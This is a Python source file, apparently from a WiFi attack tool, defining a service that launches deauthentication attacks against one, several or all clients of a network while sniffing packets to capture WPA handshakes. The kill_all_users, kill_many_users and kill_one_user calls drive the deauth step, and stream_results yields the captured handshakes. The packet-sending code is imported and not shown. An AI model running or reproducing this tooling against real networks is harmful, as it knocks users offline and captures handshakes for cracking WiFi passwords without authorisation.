import asyncio

from scapy.all import AsyncSniffer

from models import WifiNetworkModel
from models.enums import DeauthType
from utils.network import DeauthPackets, wifi_packets_callback, wifi_packets_clear


class HandshakeService():
    # Current target. Mass attack support will be added in future versions.

    def __init__(self):
        self._sniffer : AsyncSniffer | None = None
        self.queue : asyncio.Queue = asyncio.Queue()
        self.deauth_task : asyncio.Task | None = None

    async def start_catching(self, device, attack_type):
        if self._sniffer and self._sniffer.running:
            return 
        deauth = DeauthPackets()
        self.queue = asyncio.Queue()

        match attack_type:
            case DeauthType.ALL:
                self.deauth_task = asyncio.create_task(deauth.kill_all_users())
            case DeauthType.MANY:
                self.deauth_task = asyncio.create_task(deauth.kill_many_users())
            case DeauthType.ONE:
                self.deauth_task = asyncio.create_task(deauth.kill_one_user()) 

        wifi_packets_clear()

        loop = asyncio.get_running_loop()
        self._sniffer = AsyncSniffer(
            iface=device,
            prn=lambda pkt : wifi_packets_callback(pkt, self.queue, loop),
            store = 0
        )
        self._sniffer.start()
        print("handshake sniffer was started")

    async def stop_catching(self):
        if self.deauth_task:
            self.deauth_task.cancel()
            try:
                await self.deauth_task
            except asyncio.CancelledError:
                pass

        self.deauth_task = None
        print("Deauth attack task stopped")

        if self._sniffer and self._sniffer.running:
            self._sniffer.stop()
            self._sniffer = None
            print("handshake sniffer was stopped")

    async def stream_results(self):
        while True:
            raw_data = await self.queue.get()
            try:
                msg_type = raw_data.get("type")
                if msg_type == "handshake":
                    raw_network_data = raw_data.get("data")
                    if raw_network_data:
                        validated_model = WifiNetworkModel(**raw_network_data)
                        yield validated_model
                elif msg_type == "network_update":
                    pass
                        
            except Exception as e:
                print(f"Validation error: {e}")
            finally:
                self.queue.task_done()
            


    
